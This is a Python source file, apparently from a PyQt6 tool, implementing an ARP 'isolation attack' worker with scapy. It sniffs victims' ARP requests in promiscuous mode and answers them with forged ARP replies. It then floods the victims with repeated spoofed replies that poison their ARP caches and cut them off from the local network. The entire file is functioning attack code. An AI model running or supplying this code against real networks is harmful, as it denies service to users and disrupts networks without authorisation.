from PyQt6.QtCore import *
from PyQt6.QtGui import *
from PyQt6.QtWidgets import *
from scapy.all import *
from models import IsolationAttackSettings

class IsolationAttackWorker(QObject):
    finished = pyqtSignal()

    def __init__(self, settings: IsolationAttackSettings):
        super().__init__()
        self.settings = settings
        self.entries = []

    def run(self):
        print('Attack starting')

        # promiscuous sniffing is necessary
        # since the victims' ARP requests are not
        # addressed at us
        conf.sniff_promisc = True

        self.sniffer = AsyncSniffer(
            iface=self.settings.interface.name,
            prn=self.handle_packet)
        self.sniffer.start()

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.send_storm)
        self.timer.start(self.settings.response_interval)

    def stop(self):
        print('Attack stopping...')

        self.sniffer.stop(join=True)
        self.timer.stop()
        print('Attack stopped')
        conf.sniff_promisc = False
        self.finished.emit()

    def handle_packet(self, packet: Packet):
        if ARP not in packet:
            return

        # Don't act upon our ARP packages
        if packet[Ether].src == self.settings.interface.mac_addr:
            return

        for victim in self.settings.victims:
            if victim.ip_addr == packet[ARP].psrc:
                print(f'Victim sent arp request {packet.summary()}')

                response = Ether() / ARP()
                response[Ether].src = self.settings.interface.mac_addr
                response[Ether].dst = victim.mac_addr
                response[ARP].psrc = packet[ARP].pdst
                response[ARP].pdst = victim.ip_addr
                response[ARP].hwsrc = victim.mac_addr
                response[ARP].hwdst = victim.mac_addr
                response[ARP].op = 2

                self.add_to_storm((packet[ARP].pdst, victim))

                sendp(response, verbose=0, iface=self.settings.interface.name, count=self.settings.response_count)
            return

    def add_to_storm(self, entry):
        if entry not in self.entries:
            self.entries.append(entry)

    def send_storm(self):
        for ip, victim in self.entries:
            packet = Ether() / ARP()
            packet[Ether].src = self.settings.interface.mac_addr
            packet[Ether].dst = victim.mac_addr
            packet[ARP].psrc = ip
            packet[ARP].pdst = victim.ip_addr
            packet[ARP].hwsrc = victim.mac_addr
            packet[ARP].hwdst = victim.mac_addr
            packet[ARP].op = 2

            sendp(
                packet,
                verbose=0,
                iface=self.settings.interface.name,
                count=self.settings.response_count)